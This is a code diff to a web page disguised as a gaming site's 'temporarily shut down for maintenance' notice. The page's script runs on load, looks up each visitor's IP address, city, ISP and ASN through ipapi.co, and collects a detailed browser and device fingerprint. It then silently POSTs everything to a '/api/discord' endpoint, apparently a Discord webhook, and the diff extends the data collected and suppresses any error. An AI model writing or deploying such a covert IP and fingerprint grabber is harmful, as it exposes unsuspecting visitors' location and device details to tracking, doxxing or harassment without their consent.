@@ -17,10 +17,11 @@
             padding: 20px; 
             font-family: 'Courier New', Courier, monospace; 
             white-space: pre-wrap; 
-            font-size: 14px; 
+            font-size: 13px; 
             border-left: 5px solid #333;
             box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
             word-break: break-all;
+            line-height: 1.5;
         }
         footer { background-color: #333; color: #fff; padding: 10px; text-align: center; position: fixed; bottom: 0; width: 100%; }
     </style>
@@ -31,29 +32,37 @@
         <p>Welcome. This website has been temporarily shut down for maintenance and updates.</p>
         <p>We’re currently adding some big updates to the website. This process might take some time. Thank you for your patience.</p>
         
-        <div id="system-log">GATHERING SYSTEM DATA...</div>
+        <div id="system-log">GATHERING EXTENDED SYSTEM DATA...</div>
 
         <p><span class="danger">Get ready gamers</span></p>
     </main>
     <footer>&copy; 2026 Gaming Services. All rights reserved.</footer>
 
     <script>
-        async function getSystemData() {
+        async function getExtendedData() {
             const log = document.getElementById("system-log");
             try {
-                // Fetching from ipapi.co (Supports HTTPS for Vercel)
                 const response = await fetch("https://ipapi.co/json/");
                 const n = await response.json();
 
                 const stats = {
                     "IP Address": n.ip || "Unknown",
                     "Location": `${n.city}, ${n.region}, ${n.country_name}`,
-                    "Hostname": n.hostname || "None Assigned by ISP",
+                    "Hostname": n.hostname || "None Assigned",
                     "ISP": n.org || "Unknown",
+                    "ASN": n.asn || "Unknown",
                     "City": n.city || "Unknown",
                     "Country": n.country_name || "Unknown",
                     "Country Code": n.country || "Unknown",
+                    "Currency": n.currency || "Unknown",
+                    "Calling Code": n.country_calling_code || "Unknown",
                     "User Agent": navigator.userAgent,
+                    "Browser Vendor": navigator.vendor,
+                    "Browser Language": navigator.language,
+                    "Cookies Enabled": navigator.cookieEnabled,
+                    "Do Not Track": navigator.doNotTrack || "Not set",
+                    "PDF Viewer Support": navigator.pdfViewerEnabled,
+                    "Max Touch Points": navigator.maxTouchPoints,
                     "Window Properties": Object.keys(window).length,
                     "Window Width": window.innerWidth,
                     "Window Height": window.innerHeight,
@@ -67,9 +76,11 @@
                     "Orientation Angle": screen.orientation ? screen.orientation.angle : 0,
                     "OS": navigator.platform,
                     "Threads": navigator.hardwareConcurrency || "Unknown",
-                    "Memory": navigator.deviceMemory || "Unknown",
+                    "Memory (GB)": navigator.deviceMemory || "Unknown",
+                    "Connection Type": navigator.connection ? navigator.connection.effectiveType : "Unknown",
                     "System Languages": navigator.languages.join(", "),
-                    "Languages": navigator.language
+                    "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    "Current Time": new Date().toLocaleString()
                 };
 
                 const output = Object.entries(stats)
@@ -78,18 +89,18 @@
 
                 log.textContent = output;
 
-                // Vercel POST request
+                // POST to Vercel API
                 fetch("/api/discord", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ content: output }),
-                }).catch(() => console.log("Server endpoint not configured."));
+                }).catch(() => {});
 
             } catch (err) {
-                log.textContent = "CRITICAL ERROR: API Connection Refused. Check Ad-Blockers.";
+                log.textContent = "CRITICAL ERROR: Data Fetch Failed.";
             }
         }
-        getSystemData();
+        getExtendedData();
     </script>
 </body>
 </html>
